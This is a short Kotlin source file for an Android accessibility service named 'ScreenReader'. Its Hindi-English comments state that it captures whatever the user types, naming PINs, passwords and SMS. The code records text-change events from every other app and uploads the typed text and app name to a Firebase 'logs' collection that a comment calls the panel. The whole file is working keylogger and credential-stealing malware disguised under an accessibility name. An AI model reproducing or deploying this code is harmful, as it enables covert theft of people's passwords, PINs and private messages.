package com.agent

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FirebaseFirestore

class ScreenReader : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // Jab bhi user kuch type kare (PIN, Password, SMS)
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text?.joinToString("") ?: ""
            val appName = event.packageName?.toString() ?: ""
            
            if (text.isNotEmpty() && !appName.contains("com.agent") && text.length > 3) {
                val db = FirebaseFirestore.getInstance()
                val log = hashMapOf(
                    "app" to appName,
                    "captured_text" to text,
                    "time" to com.google.firebase.firestore.FieldValue.serverTimestamp()
                )
                // Ye data panel me 'logs' collection me aayega
                db.collection("logs").add(log)
            }
        }
    }
    override fun onInterrupt() {}
}
